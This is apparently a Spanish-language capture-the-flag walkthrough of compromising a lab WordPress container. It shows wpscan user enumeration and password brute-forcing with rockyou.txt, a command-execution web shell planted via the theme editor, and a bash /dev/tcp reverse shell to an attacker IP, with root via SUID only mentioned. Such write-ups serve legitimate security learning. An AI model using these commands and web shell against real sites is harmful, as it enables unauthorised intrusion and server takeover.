kali
Port: 80

- Vamos a ver la pagina web.
- No encontramos nada, vamos a hacer Fuzzing web.
![[Pasted image 20250310173234.png]]
- Encontramos un wordpress, vamos a ver que encontramos ahi.
![[Pasted image 20250310173421.png]]
- Investigando encontramos un login web de wordpress.
![[Pasted image 20250310173455.png]]
- Vamos a usar wpscam para encontrar información importante.
```
wpscan --url (IP_VICTIMA_DIRECTORIO) --enumerate u,vp
```
- Encontramos un usuario
![[Pasted image 20250310173820.png]]
- Vamos a hacer fuerza bruta con wpscan´.
```
wpscan --url http://172.17.0.2/wordpress/wp-login.php --passwords /usr/share/wordlists/rockyou.txt --usernames mario

```
![[Pasted image 20250310174132.png]]
- Ya tenemos la contraseña y ya estamos dentro.
![[Pasted image 20250310174157.png]]
- Ahora lo que tenemos que ver es si podemos subir un archivo con una reverse o editar un archivo ya creado para ingresar una reverse.
- Nos vamos a apariencia > Theme Code Editor y configuramos el codigo de index.php
![[Pasted image 20250310175319.png]]
- ==$_GET['cmd']== ---->  Variable superglobal en PHP que recoge datos enviados a través de la URL usando el método GET.
- Si en la URL ponemos un comando, este lo vamos a reconocer, vamos a agregar el comando id.
```

http:://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php?cmd=id
```
![[Pasted image 20250310175839.png]]
- Si agregamos otro código como whoami, tambien nos saldra una salida.
![[Pasted image 20250310175920.png]]
- Aquí es donde vamos a poner nuestra reverse
```
172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/index.php?cmd=bash -c "sh -i >%26 /dev/tcp/192.168.1.89/444 0>%261"
```
- Es importante que recordar que cuando escribimos la shell en la URL las "&" se cambian por "%26".
![[Pasted image 20250310180225.png]]
- Hacemos la TTY.
- No podemos escalar por sudo -l , Vamos a tener que hacerlo por SUID.
![[Pasted image 20250310180641.png]]
- Ya somos root.